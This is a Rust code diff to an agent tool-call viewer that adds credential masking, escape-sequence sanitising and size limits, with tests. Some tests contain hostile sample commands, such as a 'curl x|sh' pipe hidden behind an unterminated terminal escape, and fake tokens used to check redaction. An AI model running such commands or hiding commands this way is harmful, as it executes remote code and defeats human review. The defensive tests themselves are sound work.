@@ -5,6 +5,9 @@
 //! capped before any layout, and only the rows that are drawn are wrapped, so a 10 000 line output
 //! costs one pass over its bytes.
 
+use std::collections::HashMap;
+use std::hash::{Hash, Hasher};
+use std::rc::Rc;
 use std::sync::OnceLock;
 
 use regex::Regex;
@@ -125,8 +128,6 @@ pub struct Card {
     pub collapsible: bool,
     /// Digits of the widest line number, for the gutter.
     pub gutter: usize,
-    /// Name of the sub-agent whose pane this card links to.
-    pub link: Option<String>,
 }
 
 // ---- text hygiene -------------------------------------------------------------------------------
@@ -206,14 +207,127 @@ fn cap(s: &str, tail: bool) -> (&str, bool) {
     }
 }
 
-/// One line of an input field for a header: cleaned, first line only, at most `n` chars.
-fn head_text(s: &str, n: usize) -> String {
-    let first = split(s).next().unwrap_or("");
-    let mut t: String = clean(first).chars().take(n).collect();
-    if split(s).nth(1).is_some() || first.chars().count() > n {
-        t.push('\u{2026}');
+/// Does a key or variable name look like it holds a credential?
+fn secret_name(k: &str) -> bool {
+    let k = k.to_ascii_lowercase();
+    k == "sig"
+        || [
+            "key",
+            "token",
+            "secret",
+            "passw",
+            "credential",
+            "auth",
+            "cookie",
+            "bearer",
+            "private",
+            "signature",
+        ]
+        .iter()
+        .any(|w| k.contains(w))
+}
+
+/// `v` with the value of every secret-looking key replaced (nested too).
+fn mask(v: &Value) -> Value {
+    match v {
+        Value::Object(o) => Value::Object(
+            o.iter()
+                .map(|(k, x)| {
+                    let x = if secret_name(k) {
+                        Value::from("[redacted]")
+                    } else {
+                        mask(x)
+                    };
+                    (k.clone(), x)
+                })
+                .collect(),
+        ),
+        Value::Array(a) => Value::Array(a.iter().map(mask).collect()),
+        v => v.clone(),
     }
-    t
+}
+
+/// `s` with credentials masked: `NAME=value` and `--flag=value` for secret-looking names, secret
+/// query parameters and `user:pass@` in URLs, `Authorization`/cookie headers, bearer tokens and a few
+/// well-known key shapes. Best effort for a header line; the event stream itself is not changed.
+// shortcut: name and shape heuristics, a secret in a plain argument (`mycli login hunter2`) stays.
+pub fn redact_text(s: &str) -> String {
+    static ENV: OnceLock<Regex> = OnceLock::new();
+    static QUERY: OnceLock<Regex> = OnceLock::new();
+    static USER: OnceLock<Regex> = OnceLock::new();
+    static HDR: OnceLock<Regex> = OnceLock::new();
+    static SHAPE: OnceLock<Regex> = OnceLock::new();
+    let t = rx(
+        &ENV,
+        r#"\b([A-Za-z_][A-Za-z0-9_-]*)=("[^"]*"|'[^']*'|[^\s"'&]+)"#,
+    )
+    .replace_all(s, |c: &regex::Captures| {
+        if secret_name(&c[1]) {
+            format!("{}=[redacted]", &c[1])
+        } else {
+            c[0].to_string()
+        }
+    });
+    let t = rx(
+        &QUERY,
+        r#"(?i)([?&][a-z0-9_.-]*(?:token|key|sig|signature|secret|passw|auth|code|session)[a-z0-9_.-]*=)[^&\s#"']+"#,
+    )
+    .replace_all(&t, "${1}[redacted]");
+    let t = rx(&USER, r"(?i)(\b[a-z][a-z0-9+.-]*://[^\s/:@]+:)[^\s/@]+@")
+        .replace_all(&t, "${1}[redacted]@");
+    let t = rx(
+        &HDR,
+        r#"(?i)\b(authorization|proxy-authorization|x-api-key|api-key|cookie|set-cookie)(\s*:\s*)[^"'\n]+"#,
+    )
+    .replace_all(&t, "${1}${2}[redacted]");
+    rx(
+        &SHAPE,
+        r"(?i)\bbearer\s+[A-Za-z0-9._~+/=-]{8,}|\bsk-[A-Za-z0-9_-]{16,}|\bgh[pousr]_[A-Za-z0-9]{20,}|\bAKIA[0-9A-Z]{16}\b|\bxox[baprs]-[A-Za-z0-9-]{10,}",
+    )
+    .replace_all(&t, "[redacted]")
+    .into_owned()
+}
+
+/// A header line from an input field: credentials masked, then every control or escape made
+/// visible (`sanitize_for_display`: nothing is dropped, an unterminated OSC cannot hide the rest of a
+/// command), cut to `n` chars with an ellipsis.
+fn head_text(s: &str, n: usize) -> String {
+    let pre: String = s.chars().take(n * 2).collect();
+    let more = pre.len() < s.len();
+    let t = sanitize_for_display(&redact_text(&pre));
+    if more || t.chars().count() > n {
+        let mut c: String = t.chars().take(n).collect();
+        c.push('\u{2026}');
+        c
+    } else {
+        t
+    }
+}
+
+/// The nesting depth of JSON text (a rough scan: brackets outside strings).
+fn json_depth(t: &str) -> usize {
+    let (mut d, mut max, mut in_str, mut esc) = (0usize, 0usize, false, false);
+    for b in t.bytes() {
+        if in_str {
+            match (esc, b) {
+                (true, _) => esc = false,
+                (_, b'\\') => esc = true,
+                (_, b'"') => in_str = false,
+                _ => {}
+            }
+        } else {
+            match b {
+                b'"' => in_str = true,
+                b'[' | b'{' => {
+                    d += 1;
+                    max = max.max(d);
+                }
+                b']' | b'}' => d = d.saturating_sub(1),
+                _ => {}
+            }
+        }
+    }
+    max
 }
 
 pub fn ms_label(ms: u64) -> String {
@@ -320,8 +434,9 @@ fn text_window(text: &str, tone: Tone, cols: usize, limit: usize, tail: bool) ->
 
 // ---- shaping ------------------------------------------------------------------------------------
 
+/// A string field of a tool input, at most [`BYTE_CAP`] bytes of it.
 fn s<'a>(v: &'a Value, k: &str) -> Option<&'a str> {
-    v.get(k).and_then(Value::as_str)
+    v.get(k).and_then(Value::as_str).map(|x| cap(x, false).0)
 }
 
 fn badge(text: impl Into<String>, tone: Tone) -> Badge {
@@ -358,6 +473,7 @@ pub fn shape(item: &Item, open: bool, cols: usize) -> Option<Card> {
         diff,
         input,
         status,
+        exit_code,
         ..
     } = item
     else {
@@ -390,11 +506,13 @@ pub fn shape(item: &Item, open: bool, cols: usize) -> Option<Card> {
         hidden: 0,
         collapsible: false,
         gutter: 0,
-        link: None,
     };
+    if kind == Kind::Generic && !input.is_null() {
+        card.head = head_text(&generic_summary(input), 300);
+    }
     let dur = (*duration_ms > 0).then(|| badge(ms_label(*duration_ms), Tone::Dim));
     let (rows, hidden) = match kind {
-        Kind::Command => command(&mut card, input, raw, cols, limit),
+        Kind::Command => command(&mut card, input, *exit_code, raw, cols, limit),
         Kind::Read => read(&mut card, input, raw, err, cols, limit),
         Kind::Search => search(&mut card, name, input, raw, cols, limit),
         Kind::Edit => edit(
@@ -441,9 +559,18 @@ pub fn shape(item: &Item, open: bool, cols: usize) -> Option<Card> {
     Some(card)
 }
 
+/// What a tool with no card of its own was given, secrets masked: the usual one-line field or the JSON.
+fn generic_summary(input: &Value) -> String {
+    ["command", "file_path", "path", "url", "pattern"]
+        .iter()
+        .find_map(|k| s(input, k))
+        .map_or_else(|| mask(input).to_string(), str::to_string)
+}
+
 fn command(
     card: &mut Card,
     input: &Value,
+    exit_code: Option<i64>,
     raw: &str,
     cols: usize,
     limit: usize,
@@ -463,18 +590,20 @@ fn command(
         None => (raw, None),
     };
     let background = input.get("run_in_background").and_then(Value::as_bool) == Some(true);
-    match code {
-        Some(0) => card.badges.push(badge("exit 0", Tone::Ok)),
-        Some(n) => card.badges.push(badge(format!("exit {n}"), Tone::Err)),
-        None if card.glyph == Glyph::Ok && !background => {
-            card.badges.push(badge("exit 0", Tone::Ok));
-        }
-        None => {}
+    // the structured exit code (`process.exited`) wins; one read from the text is marked as derived
+    match (exit_code, code) {
+        (Some(0), _) => card.badges.push(badge("exit 0", Tone::Ok)),
+        (Some(n), _) => card.badges.push(badge(format!("exit {n}"), Tone::Err)),
+        (None, Some(n)) => card.badges.push(badge(format!("~exit {n}"), Tone::Dim)),
+        (None, None) => {}
     }
     if background {
         card.badges.push(badge("background", Tone::Accent));
     }
-    let tone = if code.is_some_and(|n| n != 0) {
+    let tone = if exit_code
+        .map_or(code.map(i64::from), Some)
+        .is_some_and(|n| n != 0)
+    {
         Tone::Err
     } else {
         Tone::Text
@@ -594,7 +723,9 @@ fn search(
 /// in a log written without it): numbered from 1.
 fn input_diff(name: &str, input: &Value) -> Vec<(Tone, String)> {
     let lines = |t: &str, tone| {
+        // shortcut: 5000 lines of an input are counted and drawn, the rest is ignored
         split(t)
+            .take(5000)
             .map(move |l| (tone, l.to_string()))
             .collect::<Vec<_>>()
     };
@@ -611,6 +742,7 @@ fn input_diff(name: &str, input: &Value) -> Vec<(Tone, String)> {
                 .and_then(Value::as_array)
                 .into_iter()
                 .flatten()
+                .take(1000)
             {
                 out.extend(lines(s(e, "old_string").unwrap_or(""), Tone::Del));
                 out.extend(lines(s(e, "new_string").unwrap_or(""), Tone::Add));
@@ -765,23 +897,31 @@ fn mcp(
     limit: usize,
 ) -> (Vec<Row>, usize) {
     if let Some((server, tool)) = name.strip_prefix("mcp__").and_then(|r| r.split_once("__")) {
-        card.head = format!("{server}:{tool}");
+        card.head = head_text(&format!("{server}:{tool}"), 100);
     }
     if let Some(o) = input.as_object() {
         let args: Vec<String> = o
             .iter()
+            .take(20)
             .map(|(k, v)| {
-                let t = v.as_str().map_or_else(|| v.to_string(), str::to_string);
+                let t = match v {
+                    _ if secret_name(k) => "[redacted]".to_string(),
+                    Value::String(x) => cap(x, false).0.chars().take(200).collect(),
+                    v => mask(v).to_string().chars().take(200).collect(),
+                };
                 format!("{k}={}", head_text(&t, 40))
             })
             .collect();
         card.sub = head_text(&args.join(", "), 160);
     }
     let t = raw.trim();
-    let pretty = (t.starts_with('{') || t.starts_with('['))
-        .then(|| serde_json::from_str::<Value>(t).ok())
-        .flatten()
-        .and_then(|v| serde_json::to_string_pretty(&v).ok());
+    // pretty printing indents every element by its depth: only small, shallow documents are expanded
+    let pretty =
+        ((t.starts_with('{') || t.starts_with('[')) && t.len() <= 32 * 1024 && json_depth(t) <= 16)
+            .then(|| serde_json::from_str::<Value>(t).ok())
+            .flatten()
+            .and_then(|v| serde_json::to_string_pretty(&v).ok())
+            .filter(|p| p.len() <= 128 * 1024);
     text_window(pretty.as_deref().unwrap_or(raw), err, cols, limit, false)
 }
 
@@ -803,10 +943,7 @@ fn web(
         .find_map(|l| rx(&STATUS, r"(?i)\b(?:http|status)\b[: /]*(\d{3})\b").captures(l))
         .and_then(|c| c[1].parse::<u16>().ok())
     {
-        card.badges.push(badge(
-            format!("HTTP {code}"),
-            if code < 400 { Tone::Ok } else { Tone::Err },
-        ));
+        card.badges.push(badge(format!("~HTTP {code}"), Tone::Dim));
     }
     if let Some(t) = top.iter().find_map(|l| {
         let l = l.trim();
@@ -814,7 +951,7 @@ fn web(
             .or_else(|| l.strip_prefix("Title:"))
             .or_else(|| l.strip_prefix("title:"))
     }) {
-        card.sub = head_text(t.trim(), 160);
+        card.sub = format!("~ {}", head_text(t.trim(), 160));
     }
     if name == "WebSearch" {
         let n = split(raw).filter(|l| l.contains("http")).count();
@@ -839,13 +976,62 @@ fn agent(
     if let Some(t) = s(input, "subagent_type") {
         card.sub = head_text(t, 60);
     }
-    card.link = name.map(str::to_string);
     // the last line says where it stands; open, the whole result
     let nonblank: String = split(raw)
         .filter(|l| !l.trim().is_empty())
         .collect::<Vec<_>>()
         .join("\n");
     text_window(&nonblank, Tone::Text, cols, limit, limit == 1)
+}
+
+/// Shaped cards by tool call id, so a repaint of an unchanged card shapes nothing. The key is a hash
+/// of everything a card depends on (open, width, state, output, ...), so a changed call re-shapes.
+#[derive(Default)]
+pub struct CardCache(HashMap<String, (u64, Rc<Card>)>);
+
+impl CardCache {
+    pub fn get(&mut self, item: &Item, open: bool, cols: usize) -> Option<Rc<Card>> {
+        let Item::Tool {
+            id,
+            name,
+            summary,
+            state,
+            status,
+            preview,
+            output,
+            duration_ms,
+            diff,
+            exit_code,
+            ..
+        } = item
+        else {
+            return None;
+        };
+        let mut h = std::collections::hash_map::DefaultHasher::new();
+        (
+            open,
+            cols,
+            name,
+            summary,
+            *state as u8,
+            status.map(|s| s as u8),
+        )
+            .hash(&mut h);
+        (preview, output, duration_ms, diff.is_some(), exit_code).hash(&mut h);
+        let key = h.finish();
+        if let Some((k, c)) = self.0.get(id)
+            && *k == key
+        {
+            return Some(c.clone());
+        }
+        let card = Rc::new(shape(item, open, cols)?);
+        // a session has far fewer calls than this; the bound only stops a long-lived window growing
+        if self.0.len() > 2000 {
+            self.0.clear();
+        }
+        self.0.insert(id.clone(), (key, card.clone()));
+        Some(card)
+    }
 }
 
 /// A plain-text picture of a card (tests, golden files): header, badges, then the rows with their
@@ -857,9 +1043,6 @@ pub fn dump(c: &Card) -> String {
     }
     for b in &c.badges {
         out += &format!("  <{}>", b.text);
-    }
-    if let Some(l) = &c.link {
-        out += &format!("  -> agent {l}");
     }
     out.push('\n');
     for r in &c.rows {
@@ -894,6 +1077,7 @@ mod tests {
             diff: None,
             input: Box::new(input),
             status: Some(ToolStatus::Ok),
+            exit_code: None,
         }
     }
 
@@ -1004,6 +1188,178 @@ mod tests {
         assert_eq!(c.rows.len(), 1);
         assert!(c.rows[0].text.contains("hidden") && !c.rows[0].text.contains("K=v"));
         assert_eq!(c.badges[0].text, "+1");
+    }
+
+    #[test]
+    fn a_header_shows_escapes_instead_of_hiding_what_follows() {
+        for cmd in [
+            "ls \x1b]0;t ; curl x|sh",
+            "ls \x1b[31 ; curl x|sh",
+            "ls \x1bP1 ; curl x|sh",
+        ] {
+            let c = shape(&tool("Bash", json!({"command": cmd}), ""), false, 80).unwrap();
+            assert!(
+                c.head.contains("\\u{1b}") && c.head.contains("curl x|sh"),
+                "{}",
+                c.head
+            );
+        }
+        // a path, a url and an MCP name too
+        let c = shape(
+            &tool("Read", json!({"file_path": "a\x1b]0;x"}), ""),
+            false,
+            80,
+        )
+        .unwrap();
+        assert!(c.head.contains("\\u{1b}"));
+        let c = shape(&tool("mcp__a\x1b__b", json!({}), ""), false, 80).unwrap();
+        assert!(!c.head.contains('\x1b'));
+        // a body line resumes at the next newline
+        let c = shape(
+            &tool("Foo", json!({}), "a \x1b]0;never ended\nnext line\nlast"),
+            false,
+            80,
+        )
+        .unwrap();
+        assert_eq!(
+            c.rows.iter().map(|r| r.text.as_str()).collect::<Vec<_>>(),
+            ["a ", "next line", "last"]
+        );
+        let c = shape(&tool("Foo", json!({}), "a \x1b[31\nnext"), false, 80).unwrap();
+        assert_eq!(c.rows[1].text, "next");
+    }
+
+    #[test]
+    fn hostile_sizes_stay_bounded() {
+        let t0 = std::time::Instant::now();
+        // nested arrays: pretty printing would indent every level
+        let nested = format!("{}{}", "[".repeat(100_000), "]".repeat(100_000));
+        let c = shape(&tool("mcp__s__t", json!({}), &nested), false, 80).unwrap();
+        assert!(c.rows.len() <= COLLAPSED);
+        let nested = format!("{}1{}", "[".repeat(100), "]".repeat(100));
+        let c = shape(&tool("mcp__s__t", json!({}), &nested), true, 80).unwrap();
+        assert!(
+            c.rows.len() <= OPEN_MAX
+                && c.rows.iter().map(|r| r.text.as_str()).collect::<String>() == nested,
+            "deep json stays compact"
+        );
+        // a 1 MB Write
+        let big = "line of text\n".repeat(80_000);
+        let c = shape(
+            &tool("Write", json!({"file_path": "/a", "content": big}), "ok"),
+            true,
+            80,
+        )
+        .unwrap();
+        assert!(c.rows.len() <= OPEN_MAX);
+        let c = shape(
+            &tool(
+                "Edit",
+                json!({"file_path": "/a", "old_string": big, "new_string": big}),
+                "ok",
+            ),
+            false,
+            80,
+        )
+        .unwrap();
+        assert_eq!(c.rows.len(), COLLAPSED);
+        assert!(t0.elapsed().as_secs() < 5);
+    }
+
+    #[test]
+    fn credentials_are_masked_in_headers_and_args() {
+        let head = |name: &str, input: Value| shape(&tool(name, input, ""), false, 120).unwrap();
+        let c = head(
+            "Bash",
+            json!({"command": "API_TOKEN=abc123 PATH=/bin curl -H 'Authorization: Bearer abcdefgh12345' --password=hunter2 \"https://u:pw@h.io/x?token=zzz&ok=1&sig=qq\""}),
+        );
+        for leak in [
+            "abc123",
+            "abcdefgh12345",
+            "hunter2",
+            ":pw@",
+            "zzz",
+            "sig=qq",
+        ] {
+            assert!(!c.head.contains(leak), "{leak} in {}", c.head);
+        }
+        assert!(
+            c.head.contains("PATH=/bin") && c.head.contains("ok=1"),
+            "{}",
+            c.head
+        );
+        let c = head(
+            "WebFetch",
+            json!({"url": "https://h.io/p?access_token=zzz&page=2", "prompt": "x"}),
+        );
+        assert!(!c.head.contains("zzz") && c.head.contains("page=2"));
+        let c = head(
+            "mcp__s__t",
+            json!({"Authorization": "Bearer xyz", "q": "ok", "opts": {"api_key": "k1", "n": 1}}),
+        );
+        assert!(
+            !c.sub.contains("xyz") && !c.sub.contains("k1") && c.sub.contains("q=ok"),
+            "{}",
+            c.sub
+        );
+        let c = head("Mystery", json!({"password": "p1", "x": 1}));
+        assert!(
+            !c.head.contains("p1") && c.head.contains("redacted"),
+            "{}",
+            c.head
+        );
+        assert!(
+            !head("Bash", json!({"command": "echo sk-abcdefghijklmnopqrstuv"}))
+                .head
+                .contains("abcdefgh")
+        );
+    }
+
+    #[test]
+    fn badges_from_text_are_marked_as_derived() {
+        let out = "x\n[exit code 2]";
+        let c = shape(&tool("Bash", json!({"command": "x"}), out), false, 80).unwrap();
+        assert_eq!(
+            (c.badges[0].text.as_str(), c.badges[0].tone),
+            ("~exit 2", Tone::Dim)
+        );
+        let mut i = tool("Bash", json!({"command": "x"}), out);
+        if let Item::Tool { exit_code, .. } = &mut i {
+            *exit_code = Some(2);
+        }
+        let c = shape(&i, false, 80).unwrap();
+        assert_eq!(
+            (c.badges[0].text.as_str(), c.badges[0].tone),
+            ("exit 2", Tone::Err)
+        );
+        let c = shape(
+            &tool("WebFetch", json!({"url": "u"}), "HTTP 404\n# T"),
+            false,
+            80,
+        )
+        .unwrap();
+        assert_eq!(c.badges[0].text, "~HTTP 404");
+        assert_eq!(c.sub, "~ T");
+    }
+
+    #[test]
+    fn the_cache_shapes_once_until_the_call_changes() {
+        let mut cache = CardCache::default();
+        let i = tool("Bash", json!({"command": "x"}), "a");
+        let a = cache.get(&i, false, 80).unwrap();
+        assert!(Rc::ptr_eq(&a, &cache.get(&i, false, 80).unwrap()));
+        assert!(
+            !Rc::ptr_eq(&a, &cache.get(&i, true, 80).unwrap()),
+            "open changes the card"
+        );
+        let a = cache.get(&i, true, 80).unwrap();
+        let mut j = i.clone();
+        if let Item::Tool { output, state, .. } = &mut j {
+            output.push_str("more");
+            *state = ToolState::Failed;
+        }
+        assert!(!Rc::ptr_eq(&a, &cache.get(&j, true, 80).unwrap()));
+        assert!(cache.get(&Item::User("x".into()), false, 80).is_none());
     }
 
     #[test]
